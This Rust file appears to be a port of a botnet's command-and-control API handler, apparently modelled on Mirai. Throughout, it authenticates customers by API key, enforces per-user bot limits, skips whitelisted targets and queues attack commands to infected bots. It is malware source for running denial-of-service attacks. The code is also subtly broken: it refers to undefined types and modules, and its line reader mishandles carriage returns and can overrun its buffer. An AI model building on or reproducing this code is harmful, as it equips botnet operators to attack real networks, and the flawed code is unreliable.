use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::time::Duration;
use std::str;
use std::error::Error;

struct Api {
    conn: TcpStream,
}

impl Api {
    fn new(conn: TcpStream) -> Self {
        Self { conn }
    }

    fn handle(&mut self) -> Result<(), Box<dyn Error>> {
        let mut bot_count: i32;
        let mut api_key_valid = false;
        let mut user_info = AccountInfo::default();

        // Set deadline
        self.conn.set_read_timeout(Some(Duration::new(60, 0)))?;

        let cmd = self.read_line()?;
        let mut password_split = cmd.splitn(2, '|').collect::<Vec<&str>>();

        if password_split.len() < 2 {
            self.conn.write_all(b"ERR|Failed reading line\r\n")?;
            return Ok(());
        }

        (api_key_valid, user_info) = database::check_api_code(password_split[0]);
        if !api_key_valid {
            self.conn.write_all(b"ERR|API code invalid\r\n")?;
            return Ok(());
        }

        bot_count = user_info.max_bots;
        let mut cmd = password_split[1];

        if cmd.starts_with('-') {
            let mut count_split = cmd.splitn(2, ' ').collect::<Vec<&str>>();
            if count_split.len() < 2 {
                self.conn.write_all(b"ERR|Failed parsing botcount\r\n")?;
                return Ok(());
            }

            let count = &count_split[0][1..];
            bot_count = count.parse::<i32>()?;
            if user_info.max_bots != -1 && bot_count > user_info.max_bots {
                self.conn.write_all(b"ERR|Specified bot count over limit\r\n")?;
                return Ok(());
            }
            cmd = count_split[1];
        }

        let atk = NewAttack::new(cmd, user_info.admin)?;
        let buf = atk.build()?;

        if database::contains_whitelisted_targets(&atk) {
            self.conn.write_all(b"ERR|Attack targeting whitelisted target\r\n")?;
            return Ok(());
        }

        if !database::can_launch_attack(user_info.username, atk.duration, cmd, bot_count, 1)? {
            self.conn.write_all(b"ERR|Attack cannot be launched\r\n")?;
            return Ok(());
        }

        client_list::queue_buf(buf, bot_count, "")?;
        self.conn.write_all(b"OK\r\n")?;

        Ok(())
    }

    fn read_line(&mut self) -> Result<String, Box<dyn Error>> {
        let mut buf = vec![0; 1024];
        let mut buf_pos = 0;

        loop {
            let mut byte = [0];
            let n = self.conn.read(&mut byte)?;
            if n == 0 {
                return Err("Connection closed".into());
            }
            let byte = byte[0];

            if byte == b'\r' || byte == b'\t' || byte == b'\x09' {
                buf_pos = buf_pos.saturating_sub(1);
            } else if byte == b'\n' || byte == b'\x00' {
                return Ok(String::from_utf8_lossy(&buf[..buf_pos]).to_string());
            }

            buf[buf_pos] = byte;
            buf_pos += 1;
        }
    }
}
